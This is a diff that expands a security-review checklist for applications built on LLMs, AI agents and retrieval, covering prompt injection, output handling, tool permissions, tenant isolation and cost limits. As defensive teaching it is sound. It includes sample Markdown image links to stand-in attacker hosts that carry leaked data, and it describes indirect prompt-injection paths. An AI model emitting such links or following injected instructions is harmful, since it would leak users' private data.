@@ -1,30 +1,43 @@
-# LLM and AI Feature Risks
+# LLM, Agentic AI, and RAG Security Review
 
-Apply only if the application calls a language model or other AI service.
+Apply only if the application calls a language model, embedding API, or AI agent framework.
 
-## Data exposure
-- What data is sent to the model provider (personal, financial, commercial)? Under what terms and retention? Is it appropriate for the organization's policy?
-- Prompts and responses stored in logs or analytics.
+## Foundational AI security principles
+- **Simon Willison's "Lethal Trifecta":** An AI integration becomes critically exploitable whenever a single agent/context combines:
+  1. **Access to private data** (database rows, internal docs, user emails/records),
+  2. **Exposure to untrusted input** (uploaded files, web pages, user-submitted text, external tickets), and
+  3. **An exfiltration or side-effect channel** (rendering Markdown images `![x](https://attacker.tld/?leak=...)`, clickable links, outbound HTTP/webhook tools, email/message sending, or database write tools).
+- **OWASP Top 10 for LLM Applications:** Prompt Injection (`LLM01`), Sensitive Information Disclosure (`LLM02`), Supply Chain (`LLM03`), Improper Output Handling (`LLM05`), Excessive Agency (`LLM06`), System Prompt Leakage (`LLM07`), Vector and Embedding Weaknesses (`LLM08`), and Unbounded Consumption (`LLM10`).
+- **Privilege Separation (CaMeL / Dual-LLM pattern):** Never treat an LLM as a security boundary. Enforce authentication, tenant filtering, and tool authorization deterministically in application code outside the prompt.
 
-## Prompt injection and untrusted content
-- User text, uploaded documents, web pages, and database content placed into prompts without separation or delimiting.
-- Model output treated as trusted instructions, SQL, shell commands, URLs, or HTML.
-- Output rendered as raw HTML or executed (stored XSS and code execution risk).
+## 1. Data exposure and privacy governance
+- What data is transmitted to external model or embedding providers (PII, CNICs, payroll, proprietary formulas, customer lists)? Verify zero-data-retention (ZDR) / enterprise training opt-out configurations where sensitive data is processed.
+- Prompts, completions, and embeddings logged to console, analytics, or third-party observability tools without PII redaction.
+- System prompts containing hardcoded API keys, internal URLs, database credentials, or secret business rules (violating `LLM07: System Prompt Leakage`).
 
-## Agent and tool permissions
-- Least privilege for tools: no unrestricted database, file system, shell, or network access.
-- Destructive or financial actions require explicit human confirmation.
-- Per-user scoping: the model cannot retrieve another user's data through a shared tool or index.
+## 2. Direct & indirect prompt injection (`LLM01`) and output handling (`LLM05`)
+- **Indirect prompt injection:** Untrusted external content (uploaded PDFs/CSVs, scraped web pages, support tickets, database fields authored by other users) concatenated into prompts without structural delimiters or privilege separation.
+- **Improper output handling:**
+  - Model output passed into SQL queries (`Text-to-SQL` executed on a read-write DB connection or without tenant-scoped views/RLS), `eval`, shell commands, or file paths.
+  - Model output rendered via `dangerouslySetInnerHTML` or unsanitized Markdown (enabling stored XSS or **Markdown image exfiltration** `![](https://evil.example/steal?data=...)` without a strict CSP `img-src`).
 
-## Reliability
-- Hallucination handling; human-in-the-loop on consequential outputs (approvals, payouts, customer communication).
-- Deterministic logic (calculations, policy rules) is implemented in code, not delegated to the model.
-- Structured output is validated against a schema; failures handled.
-- Model and version pinned; behavior on provider outage or deprecation.
+## 3. Agentic tool permissions and Excessive Agency (`LLM06`)
+- **Least privilege on tools:** Tools exposed to the model are narrowly typed and scoped; flag generic `run_sql`, `exec_shell`, `http_request(url)`, or unrestricted CRUD tools.
+- **Deterministic tenant binding:** User ID and `organization_id` are injected into tool handlers from the authenticated server session—**never** accepted as an LLM-supplied tool argument (`get_user_orders(user_id)` where the LLM picks `user_id`).
+- **Human-in-the-loop (HITL) gates:** Any destructive, state-mutating, financial, or external-communication action (approving payouts, deleting records, sending emails/SMS) requires explicit user confirmation in the UI before execution.
 
-## Cost and abuse
-- Token limits, request rate limits, per-user quotas, and spending alerts.
-- Protection against prompt-based resource exhaustion (very long inputs, recursive tool loops).
+## 4. RAG, vector store, and embedding isolation (`LLM08`)
+- **Pre-filtering by tenant:** Vector similarity searches (`pgvector`, Pinecone, Qdrant, Chroma) enforce tenant/role metadata filters inside the database query—never retrieve global top-$K$ chunks and ask the prompt to "ignore chunks belonging to other users".
+- Document ACL synchronization: when a source document's permissions change or it is deleted, verify its vector chunks are updated or purged.
 
-## Evaluation
-- A test set or review process for output quality; monitoring for drift and regressions after model or prompt changes.
+## 5. Deterministic boundary and reliability
+- **Code vs. LLM boundary:** Arithmetic, financial totals, tax calculations, slab lookups, and access control decisions are executed in deterministic code/tools—never estimated by token prediction.
+- **Structured output validation:** JSON/structured responses are validated against a strict schema (`zod` / `pydantic`) with graceful fallback on parse failure, refusal, timeout, or provider `429`/`5xx`.
+- Model IDs and versions pinned rather than floating aliases where output stability matters.
+
+## 6. Unbounded consumption and Denial of Wallet (`LLM10`)
+- Input character/token caps, `max_tokens` output bounds, and maximum agent tool-call loop iterations (`maxSteps` / recursion limit) enforced on every call.
+- Per-user and per-tenant rate limits, daily token budgets, and provider billing alerts configured.
+
+## 7. Evaluation and drift monitoring
+- Representative evaluation dataset (golden prompts + adversarial injection cases) used to test prompt or model changes before deployment.
